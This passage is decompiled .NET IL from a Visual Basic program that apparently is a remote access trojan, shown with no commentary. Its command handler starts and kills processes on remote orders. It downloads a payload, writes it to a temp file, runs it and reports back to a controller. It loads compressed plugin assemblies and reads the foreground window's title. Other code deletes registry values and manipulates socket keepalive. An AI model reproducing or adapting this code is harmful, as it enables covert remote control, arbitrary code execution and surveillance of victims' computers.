      IL_0045:  ldc.i4.1
      IL_0046:  ldarg.1
      IL_0047:  stelem.i8
      IL_0048:  ldloc.1
      IL_0049:  ldc.i4.2
      IL_004a:  ldarg.2
      IL_004b:  stelem.i8
      IL_004c:  ldc.i4.0
      IL_004d:  ldloc.1
      IL_004e:  ldlen
      IL_004f:  conv.ovf.i4
      IL_0050:  ldc.i4.1
      IL_0051:  sub.ovf
      IL_0052:  stloc.s    VB$t_i4$L0
      IL_0054:  stloc.s    i
      IL_0056:  br.s       IL_00bc

      IL_0058:  ldloc.3
      IL_0059:  ldloc.s    i
      IL_005b:  ldc.i4.4
      IL_005c:  mul.ovf
      IL_005d:  ldc.i4.3
      IL_005e:  add.ovf
      IL_005f:  ldloc.1
      IL_0060:  ldloc.s    i
      IL_0062:  ldelem.i8
      IL_0063:  ldc.i4.s   24
      IL_0065:  shr.un
      IL_0066:  conv.ovf.i8.un
      IL_0067:  ldc.i4     0xff
      IL_006c:  conv.i8
      IL_006d:  and
      IL_006e:  conv.ovf.u1
      IL_006f:  stelem.i1
      IL_0070:  ldloc.3
      IL_0071:  ldloc.s    i
      IL_0073:  ldc.i4.4
      IL_0074:  mul.ovf
      IL_0075:  ldc.i4.2
      IL_0076:  add.ovf
      IL_0077:  ldloc.1
      IL_0078:  ldloc.s    i
      IL_007a:  ldelem.i8
      IL_007b:  ldc.i4.s   16
      IL_007d:  shr.un
      IL_007e:  conv.ovf.i8.un
      IL_007f:  ldc.i4     0xff
      IL_0084:  conv.i8
      IL_0085:  and
      IL_0086:  conv.ovf.u1
      IL_0087:  stelem.i1
      IL_0088:  ldloc.3
      IL_0089:  ldloc.s    i
      IL_008b:  ldc.i4.4
      IL_008c:  mul.ovf
      IL_008d:  ldc.i4.1
      IL_008e:  add.ovf
      IL_008f:  ldloc.1
      IL_0090:  ldloc.s    i
      IL_0092:  ldelem.i8
      IL_0093:  ldc.i4.8
      IL_0094:  shr.un
      IL_0095:  conv.ovf.i8.un
      IL_0096:  ldc.i4     0xff
      IL_009b:  conv.i8
      IL_009c:  and
      IL_009d:  conv.ovf.u1
      IL_009e:  stelem.i1
      IL_009f:  ldloc.3
      IL_00a0:  ldloc.s    i
      IL_00a2:  ldc.i4.4
      IL_00a3:  mul.ovf
      IL_00a4:  ldc.i4.0
      IL_00a5:  add.ovf
      IL_00a6:  ldloc.1
      IL_00a7:  ldloc.s    i
      IL_00a9:  ldelem.i8
      IL_00aa:  ldc.i4.0
      IL_00ab:  shr.un
      IL_00ac:  conv.ovf.i8.un
      IL_00ad:  ldc.i4     0xff
      IL_00b2:  conv.i8
      IL_00b3:  and
      IL_00b4:  conv.ovf.u1
      IL_00b5:  stelem.i1
      IL_00b6:  ldloc.s    i
      IL_00b8:  ldc.i4.1
      IL_00b9:  add.ovf
      IL_00ba:  stloc.s    i
      IL_00bc:  ldloc.s    i
      IL_00be:  ldloc.s    VB$t_i4$L0
      IL_00c0:  ble.s      IL_0058

      IL_00c2:  ldc.i4.0
      IL_00c3:  call       uint8[] [mscorlib]System.BitConverter::GetBytes(int32)
      IL_00c8:  stloc.2
      IL_00c9:  ldarg.0
      IL_00ca:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_00cf:  ldc.i4     0x98000004
      IL_00d4:  conv.u8
      IL_00d5:  ldloc.3
      IL_00d6:  ldloc.2
      IL_00d7:  callvirt   instance int32 [System]System.Net.Sockets.Socket::IOControl(valuetype [System]System.Net.Sockets.IOControlCode,
                                                                                       uint8[],
                                                                                       uint8[])
      IL_00dc:  pop
      IL_00dd:  leave.s    IL_00f0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00df:  dup
      IL_00e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e5:  stloc.s    es
      IL_00e7:  ldc.i4.0
      IL_00e8:  stloc.0
      IL_00e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ee:  leave.s    IL_00f2

    }  // end handler
    IL_00f0:  ldc.i4.1
    IL_00f1:  ret

    IL_00f2:  ldloc.0
    IL_00f3:  ret
  } // end of method P::StKp

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  1
    .locals init ([0] string DEB,
             [1] uint8[] VB$t_array$S0)
    IL_0000:  ldarg.0
    IL_0001:  ldind.ref
    IL_0002:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0007:  stloc.1
    IL_0008:  ldloca.s   VB$t_array$S0
    IL_000a:  call       string F.P::BS(uint8[]&)
    IL_000f:  ret
  } // end of method P::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       59 (0x3b)
    .maxstack  3
    .locals init ([0] class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F.P::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string F.P::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  ldc.i4.1
      IL_001f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0024:  ldarg.0
      IL_0025:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002a:  leave.s    IL_003a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.0
      IL_0033:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0038:  leave.s    IL_003a

    }  // end handler
    IL_003a:  ret
  } // end of method P::DLV

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  1
    .locals init ([0] string ENB)
    IL_0000:  ldarg.0
    IL_0001:  call       uint8[] F.P::SB(string&)
    IL_0006:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000b:  ret
  } // end of method P::ENB

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static void  Ind(uint8[] b) cil managed
  {
    // Code size       3616 (0xe20)
    .maxstack  9
    .locals init ([0] string s,
             [1] string[] St0,
             [2] uint8[] B0,
             [3] uint8[] bytes,
             [4] class [System]System.Net.WebClient C0,
             [5] class [System]System.Net.WebClient C1,
             [6] string FN,
             [7] string P0,
             [8] string S4,
             [9] int32 k,
             [10] int32 N0,
             [11] class [mscorlib]System.Exception V_11,
             [12] int32 m,
             [13] int32 N1,
             [14] class [mscorlib]System.Exception V_14,
             [15] int32 length,
             [16] class [mscorlib]System.IO.MemoryStream Y0,
             [17] class [mscorlib]System.Exception ex,
             [18] class [mscorlib]System.Exception V_18,
             [19] class [mscorlib]System.Exception ex1,
             [20] object O0,
             [21] uint8[] t,
             [22] int32 offset,
             [23] class [mscorlib]System.IO.MemoryStream S12,
             [24] uint8[] B7,
             [25] object O1,
             [26] int32 num3,
             [27] class [mscorlib]System.IO.MemoryStream stream3,
             [28] uint8[] V_28,
             [29] object V_29,
             [30] int32 porr,
             [31] int32 V_31,
             [32] class [mscorlib]System.IO.MemoryStream V_32,
             [33] uint8[] V_33,
             [34] object V_34,
             [35] int32 V_35,
             [36] class [mscorlib]System.IO.MemoryStream V_36,
             [37] uint8[] bu3,
             [38] object obj,
             [39] int32 nu3,
             [40] class [mscorlib]System.IO.MemoryStream st3,
             [41] class [System.Drawing]System.Drawing.Graphics g,
             [42] class [mscorlib]System.IO.MemoryStream V_42,
             [43] class [mscorlib]System.IO.MemoryStream MM,
             [44] class [System.Drawing]System.Drawing.Bitmap x,
             [45] class [mscorlib]System.Exception V_45,
             [46] int32 num4,
             [47] class [mscorlib]System.IO.MemoryStream S3,
             [48] class [mscorlib]System.Exception V_48,
             [49] class [mscorlib]System.Exception V_49,
             [50] class [mscorlib]System.Exception ex5,
             [51] int32 N5,
             [52] int32 N6,
             [53] uint8[] SE,
             [54] uint8[] SQ,
             [55] uint8[] SR,
             [56] class [mscorlib]System.IO.MemoryStream V1,
             [57] class [mscorlib]System.Exception ex6,
             [58] class [mscorlib]System.Exception V_58,
             [59] string VB$t_string$L0,
             [60] string VB$t_string$L1,
             [61] string[] VB$t_array$S0,
             [62] object[] VB$t_array$S1,
             [63] string VB$t_string$S2,
             [64] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S0,
             [65] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S1,
             [66] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S2,
             [67] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S3,
             [68] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S4,
             [69] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S5,
             [70] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S6,
             [71] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S7,
             [72] valuetype [System.Drawing]System.Drawing.Rectangle VB$t_struct$S8,
             [73] valuetype [System.Drawing]System.Drawing.Size VB$t_struct$S9,
             [74] native int VB$t_struct$N10,
             [75] string VB$t_string$L3,
             [76] object[] VB$t_array$S2,
             [77] bool[] VB$t_array$S3)
    IL_0000:  ldstr      ""
    IL_0005:  stloc.0
    IL_0006:  ldarga.s   b
    IL_0008:  call       string F.P::BS(uint8[]&)
    IL_000d:  ldsfld     string F.P::Y
    IL_0012:  ldc.i4.m1
    IL_0013:  ldc.i4.0
    IL_0014:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0019:  stloc.1
    .try
    {
      IL_001a:  ldloc.1
      IL_001b:  ldc.i4.0
      IL_001c:  ldelem.ref
      IL_001d:  stloc.s    S4
      IL_001f:  ldloc.s    S4
      IL_0021:  stloc.s    VB$t_string$L0
      IL_0023:  ldloc.s    VB$t_string$L0
      IL_0025:  ldstr      "t"
      IL_002a:  ldc.i4.0
      IL_002b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0030:  ldc.i4.0
      IL_0031:  bne.un.s   IL_0041

      IL_0033:  ldloc.1
      IL_0034:  ldc.i4.1
      IL_0035:  ldelem.ref
      IL_0036:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_003b:  pop
      IL_003c:  br         IL_0122

      IL_0041:  ldloc.s    VB$t_string$L0
      IL_0043:  ldstr      "srv1"
      IL_0048:  ldc.i4.0
      IL_0049:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_004e:  ldc.i4.0
      IL_004f:  bne.un.s   IL_0072

      IL_0051:  ldstr      "srv1"
      IL_0056:  ldsfld     string F.P::Y
      IL_005b:  call       string F.P::INS()
      IL_0060:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0065:  stloc.0
      IL_0066:  ldloc.0
      IL_0067:  call       bool F.P::Send(string)
      IL_006c:  pop
      IL_006d:  br         IL_0122

      IL_0072:  ldloc.s    VB$t_string$L0
      IL_0074:  ldstr      "ll"
      IL_0079:  ldc.i4.0
      IL_007a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_007f:  ldc.i4.0
      IL_0080:  bne.un.s   IL_008d

      IL_0082:  ldc.i4.0
      IL_0083:  stsfld     bool F.P::Cn
      IL_0088:  leave      IL_0e1f

      IL_008d:  ldloc.s    VB$t_string$L0
      IL_008f:  ldstr      "sus"
      IL_0094:  ldc.i4.0
      IL_0095:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_009a:  ldc.i4.0
      IL_009b:  bne.un.s   IL_00da

      IL_009d:  ldloc.1
      IL_009e:  ldlen
      IL_009f:  conv.ovf.i4
      IL_00a0:  ldc.i4.1
      IL_00a1:  sub.ovf
      IL_00a2:  stloc.s    N0
      IL_00a4:  ldc.i4.1
      IL_00a5:  stloc.s    k
      IL_00a7:  br.s       IL_00cf

      .try
      {
        IL_00a9:  ldloc.1
        IL_00aa:  ldloc.s    k
        IL_00ac:  ldelem.ref
        IL_00ad:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_00b2:  call       bool F.P::SP(int32)
        IL_00b7:  pop
        IL_00b8:  leave.s    IL_00c9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00ba:  dup
        IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00c0:  stloc.s    V_11
        IL_00c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00c7:  leave.s    IL_00c9

      }  // end handler
      IL_00c9:  ldloc.s    k
      IL_00cb:  ldc.i4.1
      IL_00cc:  add.ovf
      IL_00cd:  stloc.s    k
      IL_00cf:  ldloc.s    k
      IL_00d1:  ldloc.s    N0
      IL_00d3:  ble.s      IL_00a9

      IL_00d5:  leave      IL_0e1f

      IL_00da:  ldloc.s    VB$t_string$L0
      IL_00dc:  ldstr      "res"
      IL_00e1:  ldc.i4.0
      IL_00e2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00e7:  ldc.i4.0
      IL_00e8:  bne.un.s   IL_0122

      IL_00ea:  ldloc.1
      IL_00eb:  ldlen
      IL_00ec:  conv.ovf.i4
      IL_00ed:  ldc.i4.1
      IL_00ee:  sub.ovf
      IL_00ef:  stloc.s    N1
      IL_00f1:  ldc.i4.1
      IL_00f2:  stloc.s    m
      IL_00f4:  br.s       IL_011c

      .try
      {
        IL_00f6:  ldloc.1
        IL_00f7:  ldloc.s    m
        IL_00f9:  ldelem.ref
        IL_00fa:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_00ff:  call       bool F.P::RP(int32)
        IL_0104:  pop
        IL_0105:  leave.s    IL_0116

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0107:  dup
        IL_0108:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_010d:  stloc.s    V_14
        IL_010f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0114:  leave.s    IL_0116

      }  // end handler
      IL_0116:  ldloc.s    m
      IL_0118:  ldc.i4.1
      IL_0119:  add.ovf
      IL_011a:  stloc.s    m
      IL_011c:  ldloc.s    m
      IL_011e:  ldloc.s    N1
      IL_0120:  ble.s      IL_00f6

      IL_0122:  ldloc.s    S4
      IL_0124:  ldstr      "rn"
      IL_0129:  ldc.i4.0
      IL_012a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_012f:  ldc.i4.0
      IL_0130:  beq.s      IL_0137

      IL_0132:  br         IL_02ab

      IL_0137:  ldloc.1
      IL_0138:  ldc.i4.2
      IL_0139:  ldelem.ref
      IL_013a:  ldc.i4.0
      IL_013b:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0140:  ldc.i4.s   31
      IL_0142:  bne.un     IL_01d2

      .try
      {
        IL_0147:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_014c:  stloc.s    Y0
        IL_014e:  ldloc.1
        IL_014f:  ldc.i4.0
        IL_0150:  ldelem.ref
        IL_0151:  ldsfld     string F.P::Y
        IL_0156:  ldloc.1
        IL_0157:  ldc.i4.1
        IL_0158:  ldelem.ref
        IL_0159:  ldsfld     string F.P::Y
        IL_015e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0163:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0168:  stloc.s    length
        IL_016a:  ldloc.s    Y0
        IL_016c:  ldarg.0
        IL_016d:  ldloc.s    length
        IL_016f:  ldarg.0
        IL_0170:  ldlen
        IL_0171:  conv.ovf.i4
        IL_0172:  ldloc.s    length
        IL_0174:  sub.ovf
        IL_0175:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_017a:  ldloc.s    Y0
        IL_017c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0181:  call       uint8[] F.P::Z(uint8[])
        IL_0186:  call       uint8[] F.P::Z(uint8[])
        IL_018b:  call       uint8[] F.P::Z(uint8[])
        IL_0190:  call       uint8[] F.P::Z(uint8[])
        IL_0195:  stloc.2
        IL_0196:  leave      IL_021d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_019b:  dup
        IL_019c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01a1:  stloc.s    ex
        IL_01a3:  ldstr      "Pi"
        IL_01a8:  ldsfld     string F.P::Y
        IL_01ad:  ldstr      "Execute ERROR"
        IL_01b2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_01b7:  call       bool F.P::Send(string)
        IL_01bc:  pop
        IL_01bd:  ldstr      "Ti"
        IL_01c2:  call       bool F.P::Send(string)
        IL_01c7:  pop
        IL_01c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01cd:  leave      IL_0e1f

      }  // end handler
      IL_01d2:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_01d7:  stloc.s    C0
      .try
      {
        IL_01d9:  ldloc.s    C0
        IL_01db:  ldloc.1
        IL_01dc:  ldc.i4.2
        IL_01dd:  ldelem.ref
        IL_01de:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_01e3:  stloc.2
        IL_01e4:  leave.s    IL_021d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01e6:  dup
        IL_01e7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01ec:  stloc.s    V_18
        IL_01ee:  ldstr      "Pi"
        IL_01f3:  ldsfld     string F.P::Y
        IL_01f8:  ldstr      "Download ERROR"
        IL_01fd:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0202:  call       bool F.P::Send(string)
        IL_0207:  pop
        IL_0208:  ldstr      "Ti"
        IL_020d:  call       bool F.P::Send(string)
        IL_0212:  pop
        IL_0213:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0218:  leave      IL_0e1f

      }  // end handler
      IL_021d:  nop
      IL_021e:  ldstr      "Ti"
      IL_0223:  call       bool F.P::Send(string)
      IL_0228:  pop
      IL_0229:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_022e:  ldstr      "."
      IL_0233:  ldloc.1
      IL_0234:  ldc.i4.1
      IL_0235:  ldelem.ref
      IL_0236:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_023b:  stloc.s    P0
      .try
      {
        IL_023d:  ldloc.s    P0
        IL_023f:  ldloc.2
        IL_0240:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0245:  ldloc.s    P0
        IL_0247:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_024c:  pop
        IL_024d:  ldstr      "Pi"
        IL_0252:  ldsfld     string F.P::Y
        IL_0257:  ldstr      "Executed As "
        IL_025c:  ldloc.s    P0
        IL_025e:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0263:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0268:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_026d:  call       bool F.P::Send(string)
        IL_0272:  pop
        IL_0273:  leave      IL_0e1f

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0278:  dup
        IL_0279:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_027e:  stloc.s    ex1
        IL_0280:  ldstr      "Pi"
        IL_0285:  ldsfld     string F.P::Y
        IL_028a:  ldstr      "Execute ERROR "
        IL_028f:  ldloc.s    ex1
        IL_0291:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0296:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_029b:  call       bool F.P::Send(string)
        IL_02a0:  pop
        IL_02a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02a6:  leave      IL_0e1f

      }  // end handler
      IL_02ab:  ldloc.s    S4
      IL_02ad:  stloc.s    VB$t_string$L1
      IL_02af:  ldloc.s    VB$t_string$L1
      IL_02b1:  ldstr      "inv"
      IL_02b6:  ldc.i4.0
      IL_02b7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02bc:  ldc.i4.0
      IL_02bd:  bne.un     IL_0452

      IL_02c2:  ldloc.1
      IL_02c3:  ldc.i4.3
      IL_02c4:  ldelem.ref
      IL_02c5:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_02ca:  ldc.i4.s   10
      IL_02cc:  ble.s      IL_0348

      IL_02ce:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_02d3:  stloc.s    S12
      IL_02d5:  ldc.i4.6
      IL_02d6:  newarr     [mscorlib]System.String
      IL_02db:  stloc.s    VB$t_array$S0
      IL_02dd:  ldloc.s    VB$t_array$S0
      IL_02df:  ldc.i4.0
      IL_02e0:  ldloc.1
      IL_02e1:  ldc.i4.0
      IL_02e2:  ldelem.ref
      IL_02e3:  stelem.ref
      IL_02e4:  ldloc.s    VB$t_array$S0
      IL_02e6:  ldc.i4.1
      IL_02e7:  ldsfld     string F.P::Y
      IL_02ec:  stelem.ref
      IL_02ed:  ldloc.s    VB$t_array$S0
      IL_02ef:  ldc.i4.2
      IL_02f0:  ldloc.1
      IL_02f1:  ldc.i4.1
      IL_02f2:  ldelem.ref
      IL_02f3:  stelem.ref
      IL_02f4:  ldloc.s    VB$t_array$S0
      IL_02f6:  ldc.i4.3
      IL_02f7:  ldsfld     string F.P::Y
      IL_02fc:  stelem.ref
      IL_02fd:  ldloc.s    VB$t_array$S0
      IL_02ff:  ldc.i4.4
      IL_0300:  ldloc.1
      IL_0301:  ldc.i4.2
      IL_0302:  ldelem.ref
      IL_0303:  stelem.ref
      IL_0304:  ldloc.s    VB$t_array$S0
      IL_0306:  ldc.i4.5
      IL_0307:  ldsfld     string F.P::Y
      IL_030c:  stelem.ref
      IL_030d:  ldloc.s    VB$t_array$S0
      IL_030f:  call       string [mscorlib]System.String::Concat(string[])
      IL_0314:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0319:  stloc.s    offset
      IL_031b:  ldloc.s    S12
      IL_031d:  ldarg.0
      IL_031e:  ldloc.s    offset
      IL_0320:  ldarg.0
      IL_0321:  ldlen
      IL_0322:  conv.ovf.i4
      IL_0323:  ldloc.s    offset
      IL_0325:  sub.ovf
      IL_0326:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_032b:  ldloc.s    S12
      IL_032d:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0332:  call       uint8[] F.P::Z(uint8[])
      IL_0337:  call       uint8[] F.P::Z(uint8[])
      IL_033c:  call       uint8[] F.P::Z(uint8[])
      IL_0341:  call       uint8[] F.P::Z(uint8[])
      IL_0346:  stloc.s    t
      IL_0348:  ldloc.s    t
      IL_034a:  ldstr      "A"
      IL_034f:  call       object F.P::P00(uint8[],
                                           string)
      IL_0354:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0359:  stloc.s    O0
      IL_035b:  ldloc.s    O0
      IL_035d:  ldnull
      IL_035e:  ldstr      "h"
      IL_0363:  ldc.i4.1
      IL_0364:  newarr     [mscorlib]System.Object
      IL_0369:  stloc.s    VB$t_array$S1
      IL_036b:  ldloc.s    VB$t_array$S1
      IL_036d:  ldc.i4.0
      IL_036e:  call       object F.P::MH()
      IL_0373:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0378:  stelem.ref
      IL_0379:  ldloc.s    VB$t_array$S1
      IL_037b:  ldnull
      IL_037c:  ldnull
      IL_037d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0382:  ldloc.s    O0
      IL_0384:  ldnull
      IL_0385:  ldstr      "p"
      IL_038a:  ldc.i4.1
      IL_038b:  newarr     [mscorlib]System.Object
      IL_0390:  stloc.s    VB$t_array$S1
      IL_0392:  ldloc.s    VB$t_array$S1
      IL_0394:  ldc.i4.0
      IL_0395:  call       string F.P::NPn()
      IL_039a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_039f:  box        [mscorlib]System.Int32
      IL_03a4:  stelem.ref
      IL_03a5:  ldloc.s    VB$t_array$S1
      IL_03a7:  ldnull
      IL_03a8:  ldnull
      IL_03a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_03ae:  ldloc.s    O0
      IL_03b0:  ldnull
      IL_03b1:  ldstr      "osk"
      IL_03b6:  ldc.i4.1
      IL_03b7:  newarr     [mscorlib]System.Object
      IL_03bc:  stloc.s    VB$t_array$S1
      IL_03be:  ldloc.s    VB$t_array$S1
      IL_03c0:  ldc.i4.0
      IL_03c1:  ldloc.1
      IL_03c2:  ldc.i4.2
      IL_03c3:  ldelem.ref
      IL_03c4:  stelem.ref
      IL_03c5:  ldloc.s    VB$t_array$S1
      IL_03c7:  ldnull
      IL_03c8:  ldnull
      IL_03c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_03ce:  ldloc.s    O0
      IL_03d0:  ldnull
      IL_03d1:  ldstr      "start"
      IL_03d6:  ldc.i4.0
      IL_03d7:  newarr     [mscorlib]System.Object
      IL_03dc:  ldnull
      IL_03dd:  ldnull
      IL_03de:  ldnull
      IL_03df:  ldc.i4.1
      IL_03e0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
